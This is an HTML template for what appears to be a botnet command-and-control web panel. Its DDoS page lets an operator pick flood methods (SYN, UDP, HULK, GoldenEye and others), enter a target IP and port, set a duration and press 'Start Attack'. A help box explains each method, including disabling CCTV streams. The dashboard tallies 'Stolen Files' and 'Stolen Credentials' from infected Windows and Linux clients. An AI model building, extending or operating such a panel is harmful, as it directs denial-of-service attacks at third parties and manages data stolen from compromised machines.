<!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{.Name}} | DDoS Control</title>

    <!-- Google Font: Source Sans Pro -->

    <link href="../static/css/all.min.css" rel="stylesheet"><!-- Theme style -->
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
    <link href="../static/css/adminlte.min.css" rel="stylesheet">
    <link href="../static/css/dataTables.bootstrap4.min.css" rel="stylesheet">
    <link href="../static/css/responsive.bootstrap4.min.css" rel="stylesheet">
    <link href="../static/css/buttons.bootstrap4.min.css" rel="stylesheet">
    <link href="../static/css/select.bootstrap4.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../static/css/toastr.min.css">
</head>

<body class="hold-transition dark-mode sidebar-mini">
    <div class="wrapper">

        <!-- Navbar -->
        <nav class="main-header navbar navbar-expand navbar-gray-dark navbar-dark">
            <!-- Left navbar links -->
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
                </li>

            </ul>

            <!-- Right navbar links -->
            <ul class="navbar-nav ml-auto">

                <li class="nav-item">
                    <a class="nav-link" data-widget="fullscreen" href="#" role="button">
                        <i class="fas fa-expand-arrows-alt"> Full Screen</i>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="../logout" role="button"><i class="fas fa-sign-out-alt"> Logout</i></a>
                </li>
            </ul>
        </nav>
        <!-- /.navbar -->

        <!-- Main Sidebar Container -->
        <aside class="main-sidebar sidebar-dark-primary elevation-4">
            <!-- Brand Logo -->
            <a href="../" class="brand-link">

                <span class="brand-text font-weight-light">
                    <center>{{.Name}}</center>
                </span>
            </a>

            <!-- Sidebar -->
            <div class="sidebar">
                <!-- Sidebar user panel (optional) -->
                <div class="user-panel mt-3 pb-3 mb-3 d-flex">
                    <div class="image">
                        <img src="../static/images/avatar6.jpg" class="img-circle elevation-2" alt="User Image">
                    </div>
                    <div class="info">
                        <a class="d-block">{{.Username}}</a>
                    </div>
                </div>


                <!-- Sidebar Menu -->
                <nav class="mt-2">
                    <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu"
                        data-accordion="false">
                        <!-- Add icons to the links using the .nav-icon class
                         with font-awesome or any other icon font library -->
                        <li class="nav-item">
                            <a href="../" class="nav-link">
                                <i class="nav-icon fas fa-tachometer-alt"></i>
                                <p>
                                    Dashboard
                                </p>
                            </a>
                        </li>
                        <li class="nav-item menu-close">
                            <a href="#" class="nav-link">
                                <i class="nav-icon fas fa-users"></i>
                                <p>
                                    Clients
                                </p>
                            </a>
                            <ul class="nav nav-treeview">
                                <li class="nav-item">
                                    <a href="../clients/windows" class="nav-link">
                                        <i class="nav-icon fab fa-windows"></i>
                                        <p>Windows</p>
                                    </a>
                                </li>
                                <li class="nav-item">
                                    <a href="../clients/linux" class="nav-link">
                                        <i class="fab fa-linux nav-icon"></i>
                                        <p>Linux</p>
                                    </a>
                                </li>
                        </li>
                    </ul>
                    <li class="nav-item">
                        <a href="../ddos" class="nav-link active">
                            <i class="nav-icon fas fa-network-wired"></i>
                            <p>
                                DDoS Control
                                <i class="right fas fa-angle-left"></i>
                            </p>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a href="../socks" class="nav-link">
                            <i class="nav-icon fas fa-project-diagram"></i>
                            <p>
                                Socks & Proxies
                            </p>
                        </a>
                    </li>
                    <li class="nav-item menu-close">
                        <a href="#" class="nav-link">
                            <i class="nav-icon fas fa-tasks"></i>
                            <p>
                                Task Management
                            </p>
                        </a>
                        <ul class="nav nav-treeview">
                            <li class="nav-item">
                                <a href="./tasks" class="nav-link">
                                    <i class="nav-icon fas fa-list-ul"></i>
                                    <p>
                                        General Tasks
                                    </p>
                                </a>
                            </li>
                        </ul>
                        <ul class="nav nav-treeview">
                            <li class="nav-item">
                                <a href="./onconnect" class="nav-link">
                                    <i class="nav-icon fas fa-ethernet"></i>
                                    <p>
                                        On Connection Tasks
                                    </p>
                                </a>
                            </li>
                        </ul>
                    </li>
                    <li class="nav-item">
                        <a href="../settings" class="nav-link">
                            <i class="nav-icon fas fa-cogs"></i>
                            <p>
                                Settings
                            </p>
                        </a>
                    </li>
                    </ul>
                </nav>
                <!-- /.sidebar-menu -->
            </div>
            <!-- /.sidebar -->
        </aside>

        <!-- Content Wrapper. Contains page content -->
        <div class="content-wrapper">
            <!-- Content Header (Page header) -->
            <div class="content-header">
                <div class="container-fluid">
                    <div class="row mb-2">
                        <div class="col-sm-6">
                            <h1><i class="fas fa-network-wired"></i> DDoS Control Center</h1>
                        </div><!-- /.col -->
                        <div class="col-sm-6">
                        </div><!-- /.col -->
                    </div><!-- /.row -->
                </div><!-- /.container-fluid -->
            </div>
            <!-- /.content-header -->

            <!-- Main content -->
            <div class="content">
                <div class="container-fluid">
                    <!-- Info boxes -->
                    <div class="row">
                        <div class="col-12 col-sm-6 col-md-3">
                            <div class="info-box">
                                <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-heartbeat"></i></span>
                                <div class="info-box-content">
                                    <span class="info-box-text">Active Clients</span> <span
                                        class="info-box-number">{{.ActiveClients}}</span>
                                </div>
                                <!-- /.info-box-content -->
                            </div>
                            <!-- /.info-box -->
                        </div>
                        <!-- /.col -->
                        <div class="col-12 col-sm-6 col-md-3">
                            <div class="info-box mb-3">
                                <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-archive"></i></span>
                                <div class="info-box-content">
                                    <span class="info-box-text">Stolen Files</span> <span
                                        class="info-box-number">{{.StolenFiles}}</span>
                                </div>
                                <!-- /.info-box-content -->
                            </div>
                            <!-- /.info-box -->
                        </div>
                        <!-- /.col -->
                        <!-- fix for small devices only -->
                        <div class="clearfix hidden-md-up"></div>
                        <div class="col-12 col-sm-6 col-md-3">
                            <div class="info-box mb-3">
                                <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-key"></i></span>
                                <div class="info-box-content">
                                    <span class="info-box-text">Stolen Credentials</span> <span
                                        class="info-box-number">{{.StolenCredentials}}</span>
                                </div>
                                <!-- /.info-box-content -->
                            </div>
                            <!-- /.info-box -->
                        </div>
                        <!-- /.col -->
                        <div class="col-12 col-sm-6 col-md-3">
                            <div class="info-box mb-3">
                                <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-database"></i></span>
                                <div class="info-box-content">
                                    <span class="info-box-text">Total Clients</span> <span
                                        class="info-box-number">{{.TotalClients}}</span>
                                </div>
                                <!-- /.info-box-content -->
                            </div>
                            <!-- /.info-box -->
                        </div>
                        <!-- /.col -->
                    </div>
                    <!-- /.row -->
                    <div class="row mb-2">
                        <div class="col-sm-6"></div>
                        <!-- /.col -->
                        <div class="col-sm-6"></div>
                        <!-- /.col -->
                    </div>
                    <!-- /.row -->
                </div>
                <!-- /.container-fluid -->
            </div>
            <!-- /.content-header -->
            <!--|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||-->
            <!-- NEED TO SETUP IF THE ATTACK METHOD USES IP, IP:PORT, URL, Etc -->
            <!-- NEED TO HANDLE THREADS TO MAKE SURE HOST ISN'T OVERLOADED -->
            <!--|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||-->
            <div class="content">
                <div class="container-fluid">
                    <div class="card">
                        <div class="card-header">
                            <h3 class="card-title">DDoS Attack Control Panel</h3>
                            <div class="card-tools">
                                <button class="btn btn-info bg-gradient-primary" data-target="#modal-ddos"
                                    data-toggle="modal" type="button"><i class="fa fa-question"></i></button>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="card card-info float-left">
                                <form action="../issue/windows" class="form-horizontal" id="ddos" method="post"
                                    name="ddos">
                                    <div class="card-body">
                                        <div class="form-group" id="dos">
                                            <div class="input-group">
                                                <label></label>
                                                <select class="form-control" id="methodSelect" name="dostype">
                                                    <option data-rn="TCP Flood" value="0">
                                                        TCP Flood
                                                    </option>
                                                    <option data-rn="UDP Flood" value="1">
                                                        UDP Flood
                                                    </option>
                                                    <option data-rn="HULK v3" value="2">
                                                        HULK v3
                                                    </option>
                                                    <option data-rn="GoldenEye" value="3">
                                                        GoldenEye
                                                    </option>
                                                    <option data-rn="HTTPS Flood" value="4">
                                                        HTTPS Flood
                                                    </option>
                                                    <option data-rn="ACE" value="5">
                                                        ACE
                                                    </option>
                                                    <option data-rn="SYN" value="6">
                                                        SYN Flood
                                                    </option>
                                                </select>
                                                <label></label>
                                                <select class="form-control" id="time" name="time">
                                                    <option data-rn="5 Minutes" value="5">
                                                        5 Minutes
                                                    </option>
                                                    <option data-rn="15 Minutes" value="15">
                                                        15 Minutes
                                                    </option>
                                                    <option data-rn="30 Minutes" value="30">
                                                        30 Minutes
                                                    </option>
                                                    <option data-rn="1 Hours" value="60">
                                                        1 Hours
                                                    </option>
                                                    <option data-rn="2 Hours" value="120">
                                                        2 Hours
                                                    </option>
                                                </select>
                                            </div>
                                            <div class="form-group">
                                                <label>IP Adress and Port:</label>
                                                <div class="input-group">
                                                    <div class="input-group-prepend"><span class="input-group-text"><i
                                                                class="fas fa-laptop"></i></span></div><input
                                                        type="text" class="form-control" placeholder="xxx.xxx.xxx.xxx"
                                                        id="ipv4" name="ipv4" data-inputmask="'alias': 'ip'"
                                                        data-mask="">
                                                    <div class="input-group-prepend"><span class="input-group-text"><i
                                                                class="fab fa-megaport"></i></span></div><input
                                                        class="form-control" placeholder="80" type="number" min="5"
                                                        max="99999" id="port" value="80" name="port">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="card-footer">
                            <button class="btn btn-success icon-btn float-left" type="submit"><i
                                    class="fas fa-fw fa-lg fa-bullseye"></i> Start Attack
                            </button>
                            &nbsp;<a class="btn btn-danger icon-btn float-right" href="#" onclick="resetForm()"><i
                                    class="fa fa-fw fa-lg fa-times-circle"></i> Clear Form</a>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /.content -->
        </div><!-- /.content-wrapper -->
        <!-- /.content-wrapper -->


        <!-- Main Footer -->
        <footer class="main-footer">
            <!-- To the right -->
            <div class="float-right d-none d-sm-inline">
                https://github.com/d-demirci
            </div>
            <!-- Default to the left -->
            <strong><i>"I'm very much a creature of habit."</i> </strong> - Eminem
        </footer>
    </div>
    <!-- ./wrapper -->

    <!-- REQUIRED SCRIPTS -->
    <div class="modal fade" id="modal-ddos">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h4 class="modal-title">DDoS Control Help</h4>
                    <button aria-label="Close" class="close" data-dismiss="modal" type="button"><span
                            aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p style="text-align: center;">&nbsp;</p>
                    <h3 style="text-align: center;">Attack Methods</h3>
                    <p><strong>TCP Flood:</strong> The most common attack involves sending numerous SYN packets to the
                        victim.</p>
                    <p><strong>UDP Flood:</strong> Sends UDP packets, typically large ones, to single destination or to
                        random ports.&nbsp;</p>
                    <p><strong>Slowloris:</strong> Sends HTTP headers to the target site in tiny chunks as slow as
                        possible.
                    </p>
                    <p><strong>HULK v3:</strong> Used to attack web servers by generating unique and obfuscated traffic
                        volumes.</p>
                    <p><strong>GoldenEye:</strong> A Layer 7 attack using KeepAlive and NoCashe.</p>
                    <p><strong>HTTPS Flood:</strong> Send seemingly legitimate set of HTTPS GET or POST requests.</p>
                    <p><strong>CCTV Attack:</strong> Remotely disable CCTV camera streams, like in spy movies.</p>
                    <p><strong>SYN Flood:</strong> Sends lots of SYN messages to server.</p>
                    <h3 style="text-align: center;">Attack Settings</h3>
                    <p><strong>IP Address and Port:</strong> The IP and the Port you wish to attack.</p>
                    <p><strong>Attack Time:</strong> How long the Attack will last. You may lose connection to the
                        Client
                        while attacking.</p>
                </div>
                <div class="modal-footer justify-content-between">
                    <button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
                </div>
            </div>
            <!-- /.modal-content -->
        </div>
        <!-- /.modal-dialog -->
    </div>
    <!-- jQuery -->
    <script src="../static/js/jquery.js">
    </script> <!-- Bootstrap 4 -->
    <script src="../static/js/bootstrap.bundle.min.js">
    </script> <!-- AdminLTE App -->
    <script src="../static/js/adminlte.min.js">
    </script>
    <script src="../static/js/jquery.dataTables.min.js">
    </script>
    <script src="../static/js/dataTables.bootstrap4.min.js">
    </script>
    <script src="../static/js/dataTables.buttons.min.js">
    </script>
    <script src="../static/js/buttons.bootstrap4.min.js">
    </script>
    <script src="../static/js/pdfmake.min.js">
    </script>
    <script src="../static/js/buttons.html5.min.js">
    </script>
    <script src="../static/js/dataTables.select.min.js">
    </script>
    <script src="../static/js/sweetalert2.all.js">
    </script>

    <script src="../static/js/moment.min.js"></script>
    <script src="../static/js/toastr.min.js"></script>
    <script src="../static/js/jquery.inputmask.min.js"></script>

    <script>

        function resetFormA() {
            document.getElementById("save").reset();
        }

        function resetFormB() {
            document.getElementById("add").reset();
        }

        $('#add').submit(function (event) {
            event.preventDefault();
            var user = $("#username").val();
            var pass = $("#password").val();
            $.ajax({
                type: "POST",
                url: "../add/admin",
                data: "username=" + user + "&password=" + pass,
                success: function (text) {
                    if (text == "success") {
                        Swal.fire('Added!', 'New Admin was Added to the Database', 'success')
                        setTimeout("location.reload(true);", 2000);
                    } else if (text == "error") {
                        Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
                    } else {
                        toastr.warning('Unknown Error: ' + text)
                    }
                }
            });
        });

        $('#save').submit(function (event) {
            event.preventDefault();
            var name = $("#name").val();
            var enckey = $("#enckey").val();
            var usragnt = encodeURIComponent($("#usrAgent").val());
            $.ajax({
                type: "POST",
                url: "../save/settings",
                data: "name=" + name + "&enckey=" + enckey + "&usr=" + usragnt,
                success: function (text) {
                    if (text == "success") {
                        Swal.fire('Saved!', 'Settings Saved', 'success')
                        setTimeout("location.reload(true);", 2000);
                    } else if (text == "error") {
                        Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
                        setTimeout("location.reload(true);", 2000);
                    } else {
                        toastr.warning('Unknown Error: ' + text)
                    }
                }
            });
        });

        $('#deamon').submit(function (event) {
            event.preventDefault();
            var val = $("#clientTimeout").val();
            $.ajax({
                type: "POST",
                url: "../save/daemon",
                data: "clientTimeout=" + val,
                success: function (text) {
                    if (text == "success") {
                        Swal.fire('Saved!', 'Deamon Settings Saved', 'success')
                        setTimeout("location.reload(true);", 2000);
                    } else if (text == "error") {
                        Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
                        setTimeout("location.reload(true);", 2000);
                    } else {
                        toastr.warning('Unknown Error: ' + text)
                    }
                }
            });
        });


        $(function () {
            $("#adminTable").DataTable({
                "responsive": true, "lengthChange": false, "autoWidth": false,
                buttons: [
                    {
                        extend: 'collection',
                        text: '<i class="fas fa-file-download"> Export<\/i>',
                        buttons: [
                            {
                                extend: 'copyHtml5',
                                text: '<i class="far fa-copy"> Copy<\/i>',
                                titleAttr: 'Copy'
                            },
                            {
                                extend: 'csvHtml5',
                                text: '<i class="fa fa-table"> CVS<\/i>',
                                titleAttr: 'CVS'
                            }
                        ]
                    }
                ]
            }).buttons().container().appendTo('#adminTable_wrapper .col-md-6:eq(0)');

        });

        function deleteAdmin(UID) {
            var id = UID.name
            Swal.fire({
                title: 'Delete Admin?',
                html: "<h3>Are you sure that you want to delete this admin account? </h3>",
                showCancelButton: true,
                confirmButtonText: `Delete`,
            }).then((result) => {
                if (result.isConfirmed) {
                    $.ajax({
                        type: "POST",
                        url: "../delete/admin",
                        data: "uid=" + id,
                        success: function (text) {
                            if (text == "success") {
                                Swal.fire('Deleted!', 'Admin Deleted from Database', 'success')
                                setTimeout("location.reload(true);", 2000);
                            } else if (text == "error") {
                                Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
                            } else {
                                Swal.fire('Unknown Error', '... : ' + text, 'error');
                            }
                        }
                    });
                } else if (result.dismiss) {
                    Swal.fire('Canceled', 'Nothing lost... Accept maybe some time.', 'info')
                }
            })
        }

        function deleteclients() {
            Swal.fire({
                title: 'Delete Clients Database?',
                html: "<h3>Are you sure that you want to delete all Clients? </h3> <code>This can not be recovered!</code>",
                showCancelButton: true,
                confirmButtonText: `Delete`,
            }).then((result) => {
                if (result.isConfirmed) {
                    $.ajax({
                        type: "POST",
                        url: "../clear/clients",
                        success: function (text) {
                            if (text == "success") {
                                Swal.fire('Deleted!', 'All clients have been deleted from Database.', 'success')
                                setTimeout("location.reload(true);", 2000);
                            } else if (text == "error") {
                                Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
                            } else {
                                Swal.fire('Unknown Error', '... : ' + text, 'error');
                            }
                        }
                    });
                } else if (result.dismiss) {
                    Swal.fire('Canceled', 'Nothing lost... Accept maybe some time.', 'info')
                }
            })
        }

        function deletecommands() {
            Swal.fire({
                title: 'Delete Commands Database?',
                html: "<h3>Are you sure that you want to delete all commands? </h3> <code>This can not be recovered!</code>",
                showCancelButton: true,
                confirmButtonText: `Delete`,
            }).then((result) => {
                if (result.isConfirmed) {
                    $.ajax({
                        type: "POST",
                        url: "../clear/commands",
                        success: function (text) {
                            if (text == "success") {
                                Swal.fire('Deleted!', 'All commands have been deleted from Database.', 'success')
                                setTimeout("location.reload(true);", 2000);
                            } else if (text == "error") {
                                Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
                            } else {
                                Swal.fire('Unknown Error', '... : ' + text, 'error');
                            }
                        }
                    });
                } else if (result.dismiss) {
                    Swal.fire('Canceled', 'Nothing lost... Accept maybe some time.', 'info')
                }
            })
        }


        toastr.options = {
            "closeButton": true,
            "debug": false,
            "newestOnTop": true,
            "progressBar": true,
            "positionClass": "toast-top-right",
            "preventDuplicates": true,
            "onclick": null,
            "showDuration": "300",
            "hideDuration": "1000",
            "timeOut": "5000",
            "extendedTimeOut": "1000",
            "showEasing": "swing",
            "hideEasing": "linear",
            "showMethod": "fadeIn",
            "hideMethod": "fadeOut"
        }
        window.onload = function () {
            let conn;
            let last;

            if (window["WebSocket"]) {
                conn = new WebSocket("ws://" + document.location.host + "/live");
                conn.onopen = function () {
                    console.log("Live Agent: Connected");
                    conn.send("ping");
                };
                conn.onclose = function (evt) {
                    console.log("Live Agent: Connection Closed (" + evt.code + ")");
                };
                conn.onmessage = function (evt) {
                    if (evt.data.length >= 1) {
                        if (evt.data === "pong") {
                            setTimeout(function () {
                                conn.send("ping");
                            }, 2000);
                        } else {
                            if (evt.data !== last) {
                                last = evt.data;
                                const words = evt.data.split("|");
                                if (words[0] === "info") {
                                    toastr.info(words[1], words[2]);
                                }
                                if (words[0] === "success") {
                                    toastr.success(words[1], words[2]);
                                }
                                if (words[0] === "error") {
                                    toastr.error(words[1], words[2]);
                                }
                            }
                        }
                    }
                };
            } else {
                alert("Your browser does not support WebSockets. Do to this you will not get Live Notifications.");
            }
        };
    </script>
</body>

</html>